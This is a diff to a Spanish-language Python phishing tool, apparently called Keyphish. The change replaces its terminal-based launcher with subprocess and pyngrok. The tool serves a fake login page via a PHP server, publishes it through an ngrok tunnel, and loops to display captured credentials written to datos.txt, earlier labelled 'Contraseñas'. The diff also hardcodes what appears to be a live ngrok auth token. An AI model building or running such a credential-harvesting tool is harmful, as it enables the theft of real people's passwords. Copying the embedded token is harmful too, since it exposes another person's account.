@@ -13,7 +13,14 @@ Se recomienda encarecidamente utilizar esta herramienta únicamente en entornos 
 ## Módulos a importar
 import os
 import time
+import subprocess
+from pyngrok import ngrok
+import sys
+import signal
+
 clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
+php_process = None
+ngrok_process = None
 
 def logo():
     print('      ██╗░░██╗███████╗██╗░░░██╗██████╗░██╗░░██╗██╗░██████╗██╗░░██╗')
@@ -23,6 +30,13 @@ def logo():
     print('      ██║░╚██╗███████╗░░░██║░░░██║░░░░░██║░░██║██║██████╔╝██║░░██║')
     print('      ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝')
     print('                                              By BR4CKSTAR')
+
+def handle_signal(signal, frame):
+    print("\nSaliendo del programa...")
+    time.sleep(2)
+    php_process.terminate()
+    ngrok.kill()
+    sys.exit(0)
 
 def usuarionombre():
     with open('index.html', 'r') as archivo:
@@ -61,15 +75,24 @@ def fotoperfil():
     archivo.close()
 
 def contra():
-    archivo = open('founduser.txt','w')
+    cf_url = tunel()
+    signal.signal(signal.SIGINT, handle_signal)
+    archivo = open("datos.txt", "w")
     archivo.close()
     while True:
-        time.sleep(2)
         clearConsole()
         logo()
-        archiv= open('founduser.txt')
-        print('Contraseñas:                Ctrl+c para salir')
-        print(archiv.read())
+        print("La URL del túnel es:", cf_url)
+        print('\n')
+        archivo = open("datos.txt", "r")
+        lineas = archivo.readlines()
+        archivo.close()
+
+        for linea in lineas:
+            print(linea, end='')
+
+        print('\nPulsa CTRL+C para regresar')
+        time.sleep(2)
 
 def link():
     archivo= open('login.php', 'w')
@@ -96,12 +119,14 @@ def link():
     os.system("python Keyphish.py")
 
 
-def ngrok():
-    os.system("gnome-terminal -- php -S localhost:8080")
-    os.system("gnome-terminal -- ngrok http 8080")
+def tunel():
+    php_process = subprocess.Popen(["php", "-S", "localhost:8080", "-t", "."], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ngrok.set_auth_token("26NrVm7Ma8aSS0EWC5l0cdNXuVs_s6PCJgUWrQMJJ71PYQcp")
+    ngrok_tunnel = ngrok.connect(8080)
+    cf_url = ngrok_tunnel.public_url
     clearConsole()
-    contra()
-    print("Las contraseñas estaran almacenadas en founduser.txt")
+    logo()
+    return cf_url
 
 def dependencias():
     os.system("sudo apt install gnome-terminal php python3 python3-pip")
@@ -131,7 +156,7 @@ if y==0:
 if y==1:
     clearConsole()
     logo()
-    ngrok()
+    contra()
 
 elif y==2:
     clearConsole()
